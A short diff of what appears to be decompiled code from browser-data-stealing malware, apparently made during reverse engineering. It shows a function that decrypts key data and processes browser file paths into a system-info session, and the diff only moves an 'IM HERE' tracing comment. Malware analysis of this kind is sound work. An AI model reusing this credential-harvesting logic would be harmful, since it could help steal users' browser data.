@@ -224,7 +224,7 @@ ExtractUserData(int brwsrPathOfshit,
         return finalCheckResult;
     }
 
-    DecryptKeyData(TheRealOne_, (int *)&rawFileData, (int *)&fileDataSize); // IM HERE
+    DecryptKeyData(TheRealOne_, (int *)&rawFileData, (int *)&fileDataSize);
 
     resultStrBrwsrOfshit = (WCHAR *)calloc(0x104, 2);
     lstrcatW(resultStrBrwsrOfshit, brwsrOfshit);
@@ -234,7 +234,7 @@ ExtractUserData(int brwsrPathOfshit,
     processedFile = ProcessingTheWideStr(resultStrBrwsrOfshit);
 
     if (fileDataSize) {
-        ProcessFilePathAndUpdateSession(*SysInfo, processedFile);
+        ProcessFilePathAndUpdateSession(*SysInfo, processedFile);  // IM HERE
         sub_407160((int)*SysInfo, rawFileData, fileDataSize);
         sub_406ED8((char *)*SysInfo);
     }
